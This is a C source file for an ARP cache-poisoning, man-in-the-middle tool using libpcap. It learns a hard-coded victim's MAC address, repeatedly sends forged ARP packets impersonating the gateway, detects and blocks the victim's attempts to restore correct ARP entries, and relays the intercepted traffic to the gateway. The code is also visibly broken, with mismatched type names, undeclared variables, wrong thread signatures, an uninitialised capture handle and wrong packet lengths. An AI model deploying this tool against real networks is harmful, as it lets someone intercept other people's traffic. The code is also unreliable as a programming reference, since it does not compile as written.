#include <pcap.h>
#include <pthread.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <arpa/inet.h>
#include <net/ethernet.h>
#include <netinet/udp.h>
#include <net/if_arp.h>    // I changed if_arp.h, for using struct arp header.
#include <regex.h>
#include <unistd.h>


#define IP_ADDR_SIZE 4
#define MAC_ADDR_SIZE 6


typedef struct _ARP_fullpacket{
    struct ether_header ether;
    struct arphdr arp_hdr;
} ARP_fullpacket;

typedef struct __BYTES_ADDR{
    unsigned char * atk_ip_bytes;
    unsigned char * atk_mac_bytes;
    unsigned char * vic_ip_bytes;
    unsigned char * vic_mac_bytes;
    unsigned char * gate_ip_bytes;
}BYTES_ADDR;



void send_pkt_while(unsigned char * pkt, int len, int isloop);
void chMac(unsigned char * macAddr, unsigned char mac_bytes[]);
void shellcmd(char * cmd, char result[]);
void my_regexp(char * src, char * pattern, unsigned char matched[]);

void * arp_thread(void * arguments);
void * relay_thread(void * arguments);

void dump(unsigned char*buf, size_t len);

void initARPInfo(unsigned char * atk_ip_bytes, unsigned char * atk_mac_bytes,
                 unsigned char * vic_ip_bytes, unsigned char * vic_mac_bytes, unsigned char * gate_ip_bytes);




int main(int argc, char * argv[])
{
    BYTE_ADDR byte_addrs;
    byte_addrs.atk_ip_bytes = malloc(sizeof(char) * IP_ADDR_SIZE);
    byte_addrs.atk_mac_bytes = malloc(sizeof(char) * MAC_ADDR_SIZE);
    byte_addrs.vic_ip_bytes = malloc(sizeof(char) * IP_ADDR_SIZE);
    byte_addrs.vic_mac_bytes = malloc(sizeof(char) * MAC_ADDR_SIZE);
    byte_addrs.gate_ip_bytes = malloc(sizeof(char) * IP_ADDR_SIZE);

    pthread_t p_thread[2];
    int thr_id;
    int status;

    initARPInfo(atk_ip_bytes, atk_mac_bytes, vic_ip_bytes, vic_mac_bytes, gate_ip_bytes);

    thr_id = pthread_create(&p_thread[0], NULL, arp_thread, (void *)&byte_addrs);

    if (thr_id < 0)
    {
       perror("thread create error : ");
       exit(0);
    }

    thr_id = pthread_create(&p_thread[1], NULL, relay_thread, (void *)&byte_addrs);

    if (thr_id < 0)
    {
       perror("thread create error : ");
       exit(0);
    }

    pthread_join(p_thread[0], (void **)&status);
    pthread_join(p_thread[1], (void **)&status);

    free(atk_ip_bytes);
    free(atk_mac_bytes);
    free(vic_ip_bytes);
    free(vic_mac_bytes);
    free(gate_ip_bytes);


    return 0;
}

void send_pkt_while(unsigned char * pkt, int len, int isloop)
{
    char *dev;
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t *pcd;  // packet capture descriptor

    dev = pcap_lookupdev(NULL);

    if (dev == NULL)
    {
        printf("%s\n", errbuf);
        exit(1);
    }

    printf("Interface : %s\n", dev); // get device name

    pcd = pcap_open_live(dev, BUFSIZ,  1, -1, errbuf);

    puts("");

    while(isloop)
    {
        pcap_sendpacket(pcd,pkt,len);
        printf("sended\n");
        sleep(1);
    }

    pcap_close(pcd);

}

void initARPInfo(unsigned char * atk_ip_bytes, unsigned char * atk_mac_bytes,
                 unsigned char * vic_ip_bytes, unsigned char * vic_mac_bytes, unsigned char * gate_ip_bytes)
{
    char  pszCommand[100];

    char * ipconfig = (char *)malloc(1024);
    char * iproute = (char *)malloc(1024);


    /* variables : attacker mac address, attacker IP address, gateway Ip address */

    unsigned char * atkMacAddr = (unsigned char *)malloc(50); // aa:aa:aa:aa:aa:aa
    unsigned char * atkIpAddr = (unsigned char *)malloc(50);; // 192.168.xxx.xxx
    unsigned char * gateIpAddr = (unsigned char *)malloc(50); // 192.168.xxx.xxx

    /****************************************/




    /* variables : regular expression pattern */

    char * mac_pat = "\\([0-9a-f]\\{2\\}:\\)\\{5\\}[0-9a-f]\\{2\\}";   // ([\da-f]{2}:){5}[\da-f]{2}
    char * ip_pat = "\\([0-9]\\{1,3\\}\\.\\)\\{3\\}[0-9]\\{1,3\\}";    // ([\d]{1,3}\.){3}[\d]{1,3}
    char * gate_pat = "\\([0-9]\\{1,3\\}\\.\\)\\{3\\}[0-9]\\{1,3\\}";  // ([\d]{1,3}\.){3}[\d]{1,3}

    /****************************************/



    /* Input shell command "ipconfig device" */

    sprintf(pszCommand, "ifconfig %s", dev);
    shellcmd(pszCommand, ipconfig);

    /****************************************/


    /* With result of ipconfig, by using regular exrpession
     * Get IP address and MAC address */

    my_regexp(ipconfig, mac_pat, atkMacAddr);
    my_regexp(ipconfig, ip_pat, atkIpAddr);

    /***********************************************************/


    /* Input shell command "ip route" for getting gateway address.
     * and using regular expression, get gateway address. */

    strcpy(pszCommand, "ip route");
    shellcmd(pszCommand, iproute);

    my_regexp(iproute, gate_pat, gateIpAddr);


    /***********************************************************/
    char *dev;
    bpf_u_int32 netp;
    char errbuf[PCAP_ERRBUF_SIZE];
    struct bpf_program fp;
    pcap_t *pcd;  // packet capture descriptor
    dev = pcap_lookupdev(errbuf);

    if (dev == NULL)
    {
        printf("%s\n", errbuf);
        exit(1);
    }

    printf("Interface : %s\n", dev); // get device name



    puts("");


    /* variables : attacker mac address, attacker IP address, gateway Ip address
     * These things are BYTE array for sending packet */

    struct in_addr atk_addr;
    struct in_addr vic_addr;
    struct ether_header ether;
    struct arphdr arp_hdr;

    /*****************************************************************************/


    unsigned char packet[1500]; // Packet will contain ARP request and be sent.

    int len; // length of packet

    unsigned char temp_atkmac[6]; // temporary mac storage.
    unsigned char temp_vicmac[6]; // temporary mac storage.
    struct in_addr gateway_addr; // for gateway byte array


    /* 192.168.xxx.xxx -> byte array */

    inet_pton(AF_INET, (char *)atkIpAddr , &atk_addr.s_addr);
    inet_pton(AF_INET, "192.168.32.81", &vic_addr.s_addr);                               //inet_pton(AF_INET, argv[1], &vic_addr.s_addr);
    inet_pton(AF_INET, (char *)gateIpAddr, &gateway_addr.s_addr);                          // get gateway IP by network byte order.



    /*********************************/


    chMac((unsigned char *)atkMacAddr, (unsigned char *)temp_atkmac);  // aa:bb:cc:dd:ee:ff -> byte array;

    /* Initialize ethernet header and ARP header for ARP request */

    memset((void *)ether.ether_dhost , 0xFF, 6);
    memcpy((void *)ether.ether_shost, (void *)temp_atkmac, 6);


    ether.ether_type = htons(ETHERTYPE_ARP);

    arp_hdr.ar_hrd = 0x0100;
    arp_hdr.ar_pro = 0x0008;
    arp_hdr.ar_hln = 0x06;
    arp_hdr.ar_pln = 0x04;
    arp_hdr.ar_op = 0x0100;

    memcpy((void *) arp_hdr.__ar_sha, (void*) temp_atkmac, 6);
    memset((void *) arp_hdr.__ar_tha, 0, 6);

    memcpy((void *) arp_hdr.__ar_sip, (void*) &(atk_addr.s_addr), 4);
    memcpy((void *) arp_hdr.__ar_tip, (void*) &(vic_addr.s_addr), 4);

    /***************************************************************/



    /* Construct real packet for sending ARP request */

    memcpy((void*)packet, (void *)&ether, sizeof(ether));
    len = sizeof(ether);

    memcpy((void*)(packet + len), (void *)&arp_hdr, sizeof(arp_hdr));
    len += sizeof(arp_hdr);

    /**************************************************/

    int res;
    struct pcap_pkthdr *header;
    const unsigned char *pkt_data;  // After ARP request, this value contains the response


    /* capturing victim's mac phase by sending ARP request and receive ARP reply */

    pcd = pcap_open_live(dev, BUFSIZ,  1, -1, errbuf);

    if (pcap_compile(pcd, &fp, NULL, 0, netp) == -1)
    {
        printf("compile error\n");
        exit(1);
    }

    if (pcap_setfilter(pcd, &fp) == -1)
    {
        printf("setfilter error\n");
        exit(0);
    }

    pcap_sendpacket(pcd,packet,len); // send ARP request to get the victim's reponse!

    while((res=pcap_next_ex(pcd, &header,&pkt_data))>=0)
    {
            if (res==0) continue;

            if(!memcmp(pkt_data + sizeof(ether) + ETHER_HDR_LEN, (void*)&vic_addr.s_addr, 4)) // If VICTIM's IP of the ARP request matches with sender IP of ARP reply
            {
                memcpy((void *)temp_vicmac, (void *)(pkt_data + 6), 6);
                printf("CAPTURED VICTIM'S MAC ADDRESS\n");
                break;
            }
    }

    printf("Victim's Mac Address : ");
    for(int i = 0 ; i < 6 ; i++)
        printf("%02x", temp_vicmac[i]);  // print Victim's Mac Adress

    free(ipconfig);
    free(iproute);
    free(atkIpAddr);
    free(atkMacAddr);
    free(gateIpAddr);

    memcpy(atk_mac_bytes, temp_atkmac, MAC_ADDR_SIZE);
    memcpy(vic_mac_bytes, temp_vicmac, MAC_ADDR_SIZE);
    memcpy(atk_ip_bytes ,(void *)&atk_addr.s_addr, IP_ADDR_SIZE);
    memcpy(vic_ip_bytes ,(void *)&vic_addr.s_addr, IP_ADDR_SIZE);
    memcpy(gate_ip_bytes, (void *)&gateway_addr.s_addr, IP_ADDR_SIZE);

    return;
}

void chMac(unsigned char * macAddr, unsigned char mac_bytes[]) // chaning aa:bb:cc:dd:ee:ff -> network byte order
{
    char tmp[3];
    for(int i = 0 ; i < 6; i++)
    {
        strncpy(tmp,(char *)macAddr,2);
        tmp[2] = 0;
        mac_bytes[i] = (char)strtoul(tmp, NULL, 16);
        macAddr += 3;
    }

}
void shellcmd(char * cmd, char result[]) // result contains the result of shell command.
{
    FILE * pp = popen(cmd, "r");
    int readSize;

    if(!pp)
    {
        printf("popen error");
        exit(1);
    }
    if(result != NULL)
    {
        readSize = fread((void*)result, sizeof(char), 1023, pp);

        if(readSize == 0)
        {
            pclose(pp);
            printf("readSize error");
            exit(1);
        }

        pclose(pp);
        result[readSize] = 0;
    }

}


void my_regexp(char * src, char * pattern, unsigned char matched[]) // regular expression
{
    regex_t regex;
    regmatch_t pmatch;
    int reti;


    /* Compile regular expression */

    reti = regcomp(&regex, pattern, 0);

    if( reti ){ printf("Could not compile regex\n"); exit(1); }

    /* Execute regular expression */

    if(!(reti = regexec(&regex, src, 1, &pmatch, 0))){
        int len = pmatch.rm_eo - pmatch.rm_so;
        strncpy((char *)matched, src+pmatch.rm_so, len);
        matched[len] = 0;
    }

}




void arp_thread(unsigned char * atk_ip_bytes, unsigned char * atk_mac_bytes,
                unsigned char * vic_ip_bytes, unsigned char * vic_mac_bytes, unsigned char * gate_ip_bytes)
{
     char packet[500];
     int pkt_len;
     pcap_t *pcd;  // packet capture descriptor
     ARP_fullpacket full_arp;

     /* INIT ARP REQUEST PACKET */

     memcpy((void *)&full_arp.ether.ether_dhost, (void *)vic_mac_bytes, MAC_ADDR_SIZE);
     memcpy((void *)&full_arp.ether.ether_shost, (void *)atk_mac_bytes, MAC_ADDR_SIZE);
     full_arp.ether.ether_type = htons(ETHERTYPE_ARP);

     full_arp.arp_hdr.ar_hrd = htons(0x0001);
     full_arp.arp_hdr.ar_pro = htons(0x0800);
     full_arp.arp_hdr.ar_hln = 0x06;
     full_arp.arp_hdr.ar_pln = 0x04;
     full_arp.arp_hdr.ar_op = htons(ARPOP_REQUEST);

     memcpy(full_arp.arp_hdr.__ar_sha, (void *) atk_mac_bytes, MAC_ADDR_SIZE);
     memcpy(full_arp.arp_hdr.__ar_sip, (void *) gate_ip_bytes, IP_ADDR_SIZE);
     memcpy(full_arp.arp_hdr.__ar_tha, 0, MAC_ADDR_SIZE);
     memcpy(full_arp.arp_hdr.__ar_tip, vic_ip_bytes, IP_ADDR_SIZE);


     pkt_len = sizeof(ARP_fullpacket);
     memcpy((void *) packet, (void *)&full_arp, pkt_len);

     /* ARP Spoofing packet is ready for arp poisoning using ARP REQUEST.
      * Now The only sending ARP Spoofing packet remained                       */

     send_pkt_while(packet, pkt_len, true);


     /***************************************************************************/

     pcap_close(pcd);
     return;

}





/*************************/
/* RELAYING PACKET PHASE */
/*************************/

void relay_thread(unsigned char * atk_ip_bytes, unsigned char * atk_mac_bytes,
                     unsigned char * vic_ip_bytes, unsigned char * vic_mac_bytes, unsigned char * gate_ip_bytes)
{

    char *dev;
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t *pcd;  // packet capture descriptor

    struct pcap_pkthdr *header;
    const unsigned char *pkt_data;
    int res; // num of packets
    ARP_fullpacket arp_recover1, arp_recover2;
    int arp_len = sizeof(ARP_fullpacket);

    unsigned char gate_mac_bytes[6];

    chMac("90:9f:33:c3:26:14", gate_mac_bytes);
    /* arp_recover1 PHASE */
    /* Contructing FAKE ARP REPLY FOR CANCELING RECOVERING ARP FRAME */

    memcpy((void *)&arp_recover1.ether.ether_dhost, (void *)vic_mac_bytes, MAC_ADDR_SIZE);
    memcpy((void *)&arp_recover1.ether.ether_shost, (void *)atk_mac_bytes, MAC_ADDR_SIZE);
    arp_recover1.ether.ether_type = htons(ETHERTYPE_ARP);

    arp_recover1.arp_hdr.ar_hrd = htons(0x0001);
    arp_recover1.arp_hdr.ar_pro = htons(0x0800);
    arp_recover1.arp_hdr.ar_hln = 0x06;
    arp_recover1.arp_hdr.ar_pln = 0x04;
    arp_recover1.arp_hdr.ar_op = htons(ARPOP_REPLY);

    memcpy(arp_recover1.arp_hdr.__ar_sha, (void *) atk_mac_bytes, MAC_ADDR_SIZE);
    memcpy(arp_recover1.arp_hdr.__ar_sip, (void *) gate_ip_bytes, IP_ADDR_SIZE);
    memcpy(arp_recover1.arp_hdr.__ar_tha, vic_mac_bytes, MAC_ADDR_SIZE);
    memcpy(arp_recover1.arp_hdr.__ar_tip, vic_ip_bytes, IP_ADDR_SIZE);



    /* arp_recover2 PHASE */
    /* Normal ARP SPOOFING FRAME */

    memcpy(arp_recover2, arp_recover1, sizeof(ARP_fullpacket)); // copy, almost same as arp_recover1

    arp_recover2.arp_hdr.ar_op = htons(ARPOP_REQUEST); // ARP_RECOVER 2 is REQUEST
    memcpy(arp_recover2.arp_hdr.__ar_tha, 0x00, MAC_ADDR_SIZE); // For Request Packet it is 0.




    dev = pcap_lookupdev(errbuf);



    /* If The packet is recovering arp packet, Re-poison by re-sending FAKE ARP REQUEST */
    /* Otherwise, Just relay. */


    while((res=pcap_next_ex(pcd, &header,&pkt_data))>=0)
    {
            if (res==0) continue;
            if(!memcmp(pkt_data + MAC_ADDR_SIZE * 2, ETHERTYPE_ARP, 2) && !memcmp(pkt_data + ETHER_HDR_LEN + 6, ARPOP_REQUEST, 2))
                // if it is ARP PACKET and ARP REQUEST,
            {
                /* If the packet is arp_target_ip is gateway, and source ip is victim's, send recover 1 packet.*/
                if( !memcmp(pkt_data + ETHER_HDR_LEN + 24, gate_ip_bytes, MAC_ADDR_SIZE)
                        && !memcmp(pkt_data + ETHER_HDR_LEN + 18, vic_ip_bytes, IP_ADDR_SIZE) )
                {
                    puts("BLOCKED THE VICTIM FROM RECOVERING (Format 1).");
                    pcap_sendpacket(pcd, arp_recover1, arp_len);             //then send arp_recover1
                }

                else if(!memcmp(pkt_data + ETHER_HDR_LEN + 14, gate_ip_bytes, IP_ADDR_SIZE ))
                {
                    puts("BLOCKED THE VICTIM FROM RECOVERING (Format 1).");
                    pcap_sendpacket(pcd, arp_recover2, arp_len);             //then send arp_recover2
                }

            }

            else
            {
                // For relaying packet, just change the ethernet destination host into gateway's mac.
                memcpy(pkt_data + 0, gate_mac_bytes, MAC_ADDR_SIZE);
                pcap_sendpacket(pcd, pkt_data, arp_len);
            }

    }


    pcap_close(pcd);
    return;
}
